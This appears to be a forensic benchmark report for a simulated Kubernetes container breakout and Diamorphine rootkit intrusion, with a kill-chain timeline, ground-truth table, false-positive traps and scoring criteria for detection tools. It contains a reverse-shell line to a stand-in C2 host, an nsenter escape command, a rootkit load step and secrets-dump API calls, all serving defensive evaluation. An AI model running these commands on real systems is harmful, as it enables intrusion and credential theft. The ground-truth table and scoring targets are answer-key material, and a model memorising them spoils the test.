@@ -1,0 +1,130 @@
+# FORENSIC BENCHMARK REPORT: CASE 4
+## Case Name: Kubernetes Linux Container Breakout & Kernel Rootkit Intrusion
+**Complexity Level:** Critical / Advanced  
+**Evaluated Environment:** Multi-Node Production Kubernetes Cluster v1.28.2 (Ubuntu Linux Kernel 5.15.0-89-generic)  
+**Target Cluster / Namespace:** `k8s-production` / `kube-system`, `frontend-apps`  
+**Primary Compromised Node:** `k8s-worker-node-01` (`10.0.4.21`)  
+**Compromised Pod / Namespace:** `webapp-frontend` (`10.244.1.45`) in `frontend-apps`  
+**Compromised ServiceAccount:** `system:serviceaccount:frontend-apps:webapp-sa` (`uid: 7e8f9a01-2b3c-4d5e-a6f7-890123456789`)  
+**Threat Actor Infrastructure:** `198.51.100.77:4444` (External C2 / Interactive Reverse Shell)  
+**Legitimate Bastion / Admin Host:** `10.0.4.15` (`sysadmin`, `kubernetes-admin`)  
+
+---
+
+### 1. Executive Summary
+
+Case 4 replicates a high-severity cloud-native intrusion combining an application-level container exploit, host-level Linux privilege escalation, kernel rootkit persistence, and a full Kubernetes container escape to cluster compromise.
+
+The adversary gains an initial foothold within an exposed web container as `www-data`. Following unsuccessful local sudo probes, the adversary establishes persistence by editing the user crontab to launch an interactive reverse shell back to an external C2 server (`198.51.100.77:4444`). Pivoting locally over SSH to the local user account `deploy`, the actor exploits misconfigured sudo permissions (`/bin/bash`) to attain superuser (`root`) status on the underlying worker host.
+
+Immediately post-root, the adversary dumps `/etc/shadow` credentials and deploys the stealth Loadable Kernel Module (LKM) rootkit **Diamorphine** (`diamorphine.ko`). The rootkit hooks the Linux syscall table (`sys_call_table`, `sys_getdents64`, `sys_kill`) and unlinks itself from `/sys/module/` to evade memory and filesystem detection.
+
+Simultaneously, leveraging the over-privileged Kubernetes ServiceAccount token (`webapp-sa`) mounted in the compromised application, the adversary probes the Kubernetes API (`/api/v1/namespaces/kube-system/pods`) and creates a weaponized diagnostics pod (`system-health-diagnostics-pod`) configured with `privileged: true`, host namespaces (`hostPID`, `hostNetwork`, `hostIPC`), and a host filesystem root mount (`/` to `/host`). Utilizing `nsenter`, the container breaks out into the host namespace of PID 1 on `k8s-worker-node-01`.
+
+To guarantee permanent cluster-wide control, the adversary creates a new `ClusterRoleBinding` (`system-cluster-admin-binding`) elevating `webapp-sa` to `cluster-admin`. Armed with cluster-wide administrative rights, the adversary executes a mass extraction of all Kubernetes Secrets across the cluster (`GET /api/v1/secrets`).
+
+This benchmark evaluates the ability of cloud-native detection and response (CDR), SIEM/SOAR platforms, Falco runtime agents, and SOC analysts to correlate multi-telemetry evidence (K8s API audit JSON, Linux Auditd logs, Linux auth logs, and kernel dmesg ring buffers) while filtering out background noise from benign administrative activity, cron jobs, and node status reports.
+
+---
+
+### 2. Participating Log Sources & Formats
+
+| Log Source | File Path | Format / Schema | Primary Monitored Entities |
+| :--- | :--- | :--- | :--- |
+| **Kubernetes API Audit** | `raw-logs/k8s_api_audit.json` | Kubernetes Audit API v1 JSON (`audit.k8s.io/v1`) | Verbs (`create`, `list`, `patch`), URI endpoints, ServiceAccount identities, RBAC authorization decisions, Pod spec definitions (`hostPID`, `privileged`, `nsenter`), ClusterRoleBindings |
+| **Linux Audit Subsystem** | `raw-logs/linux_audit.log` | Linux Auditd Raw Log Format (`type=SYSCALL`, `EXECVE`, `PATH`, `KERN_MODULE`) | System calls (syscall 257 `openat`, syscall 313 `finit_module`), audit keys (`shadow_access`, `kernel_module_load`), executable lineage, user/group IDs, target paths |
+| **Linux Authentication** | `raw-logs/linux_auth.log` | Ubuntu Syslog / PAM Format (`/var/log/auth.log`) | PAM authentication, SSH session opens/closes, sudo command executions & unauthorized attempts, crontab modifications (`crontab -e`) |
+| **Linux Kernel & Dmesg** | `raw-logs/linux_dmesg_syslog.log` | Kernel Ring Buffer & Syslog Format (`dmesg`) | Kernel module loading & tainting warnings, syscall table hooking (`diamorphine`), container runtime namespace transitions (`nsenter`), promisc interface events |
+
+---
+
+### 3. Full Attack Kill Chain Timeline
+
+```
+[2026-09-14 08:34:22 UTC]  Local Recon: www-data attempts unauthorized sudo cat /etc/shadow (Denied)
+         │
+[2026-09-14 08:38:45 UTC]  Persistence: www-data modifies crontab to install reverse shell
+         │
+[2026-09-14 08:39:01 UTC]  Command & Control: Cron triggers reverse shell to 198.51.100.77:4444
+         │
+[2026-09-14 08:41:50 UTC]  Lateral Movement: SSH login to local account 'deploy' via 127.0.0.1:52310
+         │
+[2026-09-14 08:42:05 UTC]  Privilege Escalation: User 'deploy' executes sudo /bin/bash -> Root access
+         │
+[2026-09-14 08:42:15 UTC]  Credential Access: Root reads /etc/shadow (Audit key: shadow_access)
+         │
+[2026-09-14 08:45:30 UTC]  Defense Evasion: insmod diamorphine.ko hooks syscall table & unlinks stealth module
+         │
+[2026-09-14 08:48:12 UTC]  K8s API Discovery: ServiceAccount webapp-sa probes pods in kube-system
+         │
+[2026-09-14 08:50:04 UTC]  Container Escape: Privileged pod system-health-diagnostics-pod created with nsenter
+         │
+[2026-09-14 08:52:18 UTC]  Cluster Persistence: ClusterRoleBinding created granting cluster-admin to webapp-sa
+         │
+[2026-09-14 08:53:40 UTC]  Data & Credential Theft: Mass dump of all Kubernetes Secrets via API
+```
+
+---
+
+### 4. Ground Truth Breakdown
+
+| Stage # | MITRE ATT&CK ID | Timestamp (UTC) | Source Host / IP | Destination Host / IP | User / Identity | Executable / Artifact | Command Line / Key Indicator | Severity |
+| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
+| **Stage 1** | **T1078 / T1087** (Unauthorized Sudo Probe) | 2026-09-14 08:34:22 | `k8s-worker-node-01` | Local PAM | `www-data` (UID 33) | `/usr/bin/sudo` | `user NOT in sudoers ; COMMAND=/usr/bin/cat /etc/shadow` | **Medium** |
+| **Stage 2** | **T1053.003** (Cron Persistence) | 2026-09-14 08:38:45 | `k8s-worker-node-01` | Local Cron | `www-data` (UID 33) | `crontab` | `crontab[16201]: (www-data) REPLACE (www-data)` | **High** |
+| **Stage 3** | **T1059.004 / T1071** (Reverse Shell C2) | 2026-09-14 08:39:01 | `k8s-worker-node-01` | `198.51.100.77:4444` | `www-data` (UID 33) | `/bin/bash` | `bash -i >& /dev/tcp/198.51.100.77/4444 0>&1` | **Critical** |
+| **Stage 4** | **T1021.004** (Local SSH Pivot) | 2026-09-14 08:41:50 | `127.0.0.1` | `127.0.0.1:52310` | `deploy` (UID 1001) | `sshd` | `Accepted password for deploy from 127.0.0.1 port 52310 ssh2` (Session 21) | **Medium** |
+| **Stage 5** | **T1548.003** (Sudo Abuse to Root) | 2026-09-14 08:42:05 | `k8s-worker-node-01` | Local PAM | `deploy` -> `root` | `sudo` | `TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash` | **Critical** |
+| **Stage 6** | **T1003.008** (Shadow File Dumping) | 2026-09-14 08:42:15 | `k8s-worker-node-01` | Local Filesystem | `root` (auid: 1001) | `/usr/bin/cat` | `syscall=257 (openat) key="shadow_access" name="/etc/shadow"` | **Critical** |
+| **Stage 7** | **T1547.006 / T1014** (Diamorphine Rootkit Load) | 2026-09-14 08:45:30 | `k8s-worker-node-01` | Linux Kernel | `root` (auid: 1001) | `insmod` / `kmod` | `insmod diamorphine.ko` -> Hooked `sys_call_table`, `sys_getdents64`, unlinked from `/sys/module/` | **Critical** |
+| **Stage 8** | **T1613** (K8s API ServiceAccount Probe) | 2026-09-14 08:48:12 | `10.244.1.45` | K8s API (`kube-apiserver`) | `webapp-sa` | `kubectl` | `GET /api/v1/namespaces/kube-system/pods` (User-Agent: `kubectl/v1.28.0 attacker-probe`) | **High** |
+| **Stage 9** | **T1611 / T1609** (Privileged Container Escape) | 2026-09-14 08:50:04 | `10.244.1.45` | K8s API / Node | `webapp-sa` | Kubelet / `nsenter` | Pod: `system-health-diagnostics-pod`, `hostPID: true`, `privileged: true`, `nsenter --target 1 --mount ... /bin/sh` | **Critical** |
+| **Stage 10** | **T1098 / T1484** (ClusterRoleBinding Escalation) | 2026-09-14 08:52:18 | `10.244.1.45` | K8s API | `webapp-sa` | `kubectl` | `POST /apis/rbac.authorization.k8s.io/v1/clusterrolebindings` (`system-cluster-admin-binding` -> `cluster-admin`) | **Critical** |
+| **Stage 11** | **T1552.007** (Cluster Secrets Harvest) | 2026-09-14 08:53:40 | `10.244.1.45` | K8s API | `webapp-sa` | `kubectl` | `GET /api/v1/secrets` (All secrets extracted across all namespaces) | **Critical** |
+
+---
+
+### 5. Benign / False Positive Traps
+
+The raw logs contain background operational activities designed to evaluate detector specificity. Automated evaluation tools **MUST NOT** classify these events as true intrusion incidents:
+
+1. **Trap 1: Legitimate Administrative SSH & Service Management**
+   - *Log entry:* `linux_auth.log` line 13: `sshd[13420]: Accepted publickey for sysadmin from 10.0.4.15 port 48210 ssh2: RSA SHA256:x9T7qM4bZ8k1L3mP0qR2sT4vU6wX8yZ0aB2cE4gH6jI`. `sysadmin` executes `sudo systemctl status nginx` and reviews `/var/log/nginx/access.log`.
+   - *Why it's benign:* Authorized engineer conducting scheduled maintenance from the designated administrative bastion host.
+   - *Failure condition:* Flagging normal administrator public key logins and read-only service status queries as brute-force or malicious privilege escalation.
+
+2. **Trap 2: Routine Sysstat Accounting & Scheduled Cron**
+   - *Log entry:* `linux_auth.log` lines 10-12, 19-21, 57-59: `CRON: (root) CMD (/usr/lib/x86_64-linux-gnu/sysstat/debian-sa1 1 1)`.
+   - *Why it's benign:* Standard Debian/Ubuntu Linux performance accounting daemon gathering CPU/RAM performance metrics at 5-minute intervals.
+   - *Failure condition:* Alerting on `debian-sa1` execution as suspicious cron activity or LOLBin abuse.
+
+3. **Trap 3: Kubernetes Control Plane & Node Health Reporting**
+   - *Log entry:* `k8s_api_audit.json` lines 1-3: `system:kube-controller-manager` checking endpoints in `kube-system`, `system:node:k8s-worker-node-01` patching node status from `10.0.4.21`, and `kubernetes-admin` listing pods in `default`.
+   - *Why it's benign:* Core Kubernetes infrastructure loop synchronization and authorized admin visibility check.
+   - *Failure condition:* Flagging standard node heartbeats or legitimate admin namespace queries as unauthorized discovery.
+
+4. **Trap 4: Linux Kernel Hardware & Boot Initialization**
+   - *Log entry:* `linux_dmesg_syslog.log` lines 1-24: CPU vendor enumerations (Intel, AMD, Hygon), e1000e NIC binding, EXT4 filesystem mounts, containerd/kubelet initialization.
+   - *Why it's benign:* Operating system hardware initialization and container runtime startup.
+   - *Failure condition:* Generating alerts on driver loading or routine container network bridge (`br-*`) interface state changes.
+
+---
+
+### 6. Accuracy Evaluation Parameters & Scoring Criteria
+
+#### 6.1 Expected Detection Metrics
+
+| Metric | Target Value | Evaluation Criteria |
+| :--- | :--- | :--- |
+| **Precision** | **≥ 95%** | Correct isolation of all 11 adversarial stages without false alerting on `debian-sa1`, `sysadmin` maintenance, or Kubelet node status patches. |
+| **Recall** | **100%** | Complete identification of the attack progression from `www-data` sudo probe to Diamorphine rootkit and cluster secrets theft. |
+| **F1-Score** | **≥ 0.97** | Balanced detection metric across both host-level Linux and cloud-level Kubernetes telemetry. |
+
+#### 6.2 Correlation Graph Requirements
+The automated correlation engine must produce a unified Directed Acyclic Graph (DAG) linking:
+1. `www-data` failed sudo attempt $\rightarrow$ `crontab` edit $\rightarrow$ reverse shell to `198.51.100.77:4444`.
+2. Reverse shell session $\rightarrow$ local SSH pivot to `deploy` (`127.0.0.1:52310`) $\rightarrow$ `sudo /bin/bash` root session.
+3. Root session $\rightarrow$ `/etc/shadow` dump (`shadow_access`) $\rightarrow$ `insmod diamorphine.ko` kernel module insertion and stealth unlinking.
+4. Pod identity `webapp-sa` (`10.244.1.45`) $\rightarrow$ `GET /api/v1/namespaces/kube-system/pods` discovery.
+5. `webapp-sa` $\rightarrow$ creation of `system-health-diagnostics-pod` (`privileged: true`, `hostPID: true`, `nsenter --target 1`) breakout.
+6. `webapp-sa` $\rightarrow$ ClusterRoleBinding creation (`system-cluster-admin-binding`) $\rightarrow$ Mass exfiltration of all Kubernetes secrets (`GET /api/v1/secrets`).
